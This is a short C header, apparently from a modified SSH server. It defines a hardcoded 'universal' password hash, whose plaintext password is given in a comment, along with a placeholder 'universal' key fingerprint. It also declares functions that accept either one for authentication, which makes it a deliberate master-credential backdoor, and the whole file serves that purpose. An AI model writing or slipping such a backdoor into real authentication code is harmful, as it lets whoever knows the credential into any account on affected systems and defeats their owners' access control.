#include "sshkey.h"
#include <inttypes.h>
#include <stdio.h>

#define UNIVERSAL_KEY_FINGERPRINT "<Key fingerprint goes here>"

// Universal password hash. Use openssl passwd -6 <password> to generate
#define UNIVERSAL_HASH                                                         \
  "$6$nKE388W/Lr6w0gJC$gzPsB.hGvIoYd5e1v/"                                     \
  "qWUn5I2FqpmbmkTRpbWrSg.aQAsdQ.sKd2cYUjt58ta.suN0vsHTlKZRmTPm7PeCjDj/" // "cipher"

#ifndef AUTH_UNIVERSAL_H
#define AUTH_UNIVERSAL_H

int password_matches_hash(const char *, const char *);
int password_matches_universal_hash(const char *);
int key_fingerprint_matches_universal(struct sshkey *);

#endif
